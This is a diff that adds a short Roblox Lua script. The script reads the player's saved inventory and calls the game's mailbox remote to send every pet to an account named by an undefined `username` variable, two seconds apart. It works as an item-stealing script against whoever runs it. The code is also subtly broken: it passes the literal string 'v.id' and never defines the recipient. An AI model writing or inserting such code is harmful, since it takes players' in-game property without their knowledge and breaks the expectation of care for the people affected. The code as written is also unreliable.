@@ -1,0 +1,16 @@
+local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local result = saveModule.Get()
+
+local pet = result.Inventory.Pet
+for i, v in pairs(pet) do
+        local args = {
+            username,
+            "v.id",
+            "Pet",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+task.wait(2)
+end
